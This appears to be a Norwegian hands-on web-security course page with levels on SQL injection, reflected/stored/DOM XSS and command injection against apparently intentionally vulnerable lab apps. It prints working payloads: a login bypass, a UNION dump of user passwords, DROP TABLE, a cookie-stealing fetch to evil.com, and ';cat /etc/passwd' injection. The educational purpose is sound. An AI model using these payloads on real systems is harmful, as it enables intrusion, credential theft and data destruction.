01HTML & CSS — slik er nettsider bygget
GrunnlagNivå 1▶
Nivå 1 — HTML & CSS
📄 Hva er HTML?

HTML (HyperText Markup Language) er språket alle nettsider er bygget med. Det definerer strukturen — hva som er en overskrift, en knapp, et inputfelt, en lenke.

Nettleseren leser HTML og viser det som en nettside.

🎨 Hva er CSS?

CSS styrer utseendet — farger, skriftstørrelser, layout og animasjoner. HTML = skjellettet, CSS = klærne.

1
Rediger HTML til høyre og se hva som skjer i forhåndsvisningen
2
Legg til et <input>-felt og en <button>
3
Forklar: hva er <form> og hvorfor er det viktig for sikkerhet?

03Injection — hva er det og hvorfor er det farlig?
GrunnlagNivå 3▶
Nivå 3 — Injection intro
💉 Hva er injection?

Injection skjer når en angriper sender inn kode der applikasjonen forventer data. Det er som å skrive en kommando i et skjema — og banken din kjører den blindt.

⚠️ Hvorfor er det #1 på OWASP Top 10?

OWASP rangerer injection som en av de farligste sårbarhetene fordi det er enkelt å utnytte og konsekvensene er katastrofale — full tilgang til database, serverfiler eller OS.

1
Klikk gjennom de tre injection-typene til høyre
2
Forstå hva som skiller SQL Injection, XSS og Command Injection
3

04SQL Injection — login bypass (ekte sårbar app)
SQL InjectionNivå 4▶
Nivå 4 — Login bypass
🗄️ Hvordan SQL fungerer

Når du logger inn kjøres en SQL-spørring mot databasen. Problemet oppstår når applikasjonen setter inn brukerinput direkte uten å rense det.

SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
Mål
1
Prøv å logge inn med brukernavn admin og feil passord
2
Prøv payloaden ' OR '1'='1' -- som brukernavn
3
Se SQL-spørringen som kjøres i sanntid
4
Forklar: hva gjør -- på slutten av payloaden?
-- er en SQL-kommentar. Alt etter -- ignoreres av databasen — passord-sjekken nullstilles.
Payload: ' OR '1'='1' --

'1'='1' er alltid sant → betingelsen er alltid sann → du er logget inn.

05SQL Injection — dump data med UNION
SQL InjectionNivå 5▶
Nivå 5 — UNION attack
🔗 UNION i SQL

UNION kombinerer resultater fra to SQL-spørringer. En angriper kan bruke dette til å hente data fra andre tabeller.

SELECT name FROM products WHERE id = '1' UNION SELECT username, password FROM users --
Mål
1
Søk normalt med ID 1, 2, 3
2
Injiser: 1' UNION SELECT username, password FROM users --
3
Se alle brukere og passord dumpes i søkeresultatet
4
Forklar: hvilken del av CIA brytes her?
UNION krever at begge spørringer har like mange kolonner. Søkesiden viser to kolonner (navn og pris).
Payload: 1' UNION SELECT username, password FROM users --
Konfidensialitet brytes.

🔗 URL-parametre som angrepspunkt

Ikke bare inputfelt er sårbare — URL-parametre sendes direkte til databasen. Angriperen trenger ikke fylle ut et skjema, de redigerer bare URL-en.

Mål

2

3
Prøv 1; DROP TABLE users --
4
Forklar: hvorfor er URL-parametre like farlige som inputfelt?
DROP TABLE ville slettet hele brukertabellen permanent — tilgjengelighet og integritet brytes.

07XSS — Reflected (reflektert injeksjon)
XSSNivå 7▶
Nivå 7 — Reflected XSS
🪞 Hva er XSS?

XSS er injection av JavaScript i en nettside. I stedet for å angripe databasen, angriper du nettleseren til andre brukere. Reflected XSS: payloaden sendes i URL-en og reflekteres tilbake.

Mål
1
Søk normalt — se at søkeordet reflekteres
2
Søk med <b>fett</b>
3
Injiser <img src=x onerror="document.getElementById('xss-cookie').style.display='block'">
4
Forklar: hva er session hijacking?
En ekte angriper bruker: onerror="fetch('evil.com?c='+document.cookie)" — session hijacking.

08XSS — Stored (lagret injeksjon)
XSSNivå 8▶
Nivå 8 — Stored XSS
💾 Stored vs Reflected

Stored XSS lagrer payloaden i databasen og kjører den for alle som besøker siden. Tenk deg en ondsinnet kommentar på en nyhetsside med 100 000 lesere.

Mål
1
Legg igjen en normal kommentar
2
Legg igjen <img src=x onerror="this.closest('.ts-comment').style.border='3px solid red'">
3
Klikk "Simuer ny besøkende" — kjøres payloaden?
4
Forklar: hvorfor er stored farligere enn reflected?
Stored er farligere: offeret trenger ikke klikke en spesiell lenke — de besøker bare siden normalt.

🌐 DOM XSS — serveren ser ingenting

DOM XSS skjer helt i nettleseren. Payloaden leses av JavaScript — serveren ser den aldri. Vanskelig å oppdage med server-side filtrering.

// Sårbar kode: document.getElementById('greeting').innerHTML = 'Hei, ' + location.search.slice(6);
Mål
1
Skriv et navn — fungerer det normalt?
2
Injiser <img src=x onerror="alert('XSS')">
3
Forklar: hvorfor ser ikke serveren denne payloaden?
4
Fix: innerHTML vs textContent — hva er forskjellen?
Fix: element.textContent = 'Hei, ' + name; — textContent tolker aldri HTML.

10Command Injection — kontroll over serveren
CMDiNivå 10▶
Nivå 10 — Command Injection
💻 Hva er Command Injection?

Command Injection skjer når brukerinput sendes direkte til OS som en kommando. Et ping-verktøy kan misbrukes til å kjøre hvilken som helst OS-kommando.

# Normal: ping 8.8.8.8 # Injection: ping 8.8.8.8; cat /etc/passwd
Mål
1
Ping en normal IP
2
Injiser 8.8.8.8; whoami
3
Prøv 8.8.8.8; cat /etc/passwd
4
Forklar: hvorfor er CMDi verre enn SQL Injection?
CMDi gir tilgang til hele OS — ikke bare databasen. Du kan installere malware, opprette bakdørsbrukere eller starte en reverse shell.

CSP er den viktigste headeren mot XSS. Den forteller nettleseren hvilke script-kilder som er tillatt. Inline scripts blokkeres selv om en angriper klarer å injisere dem.
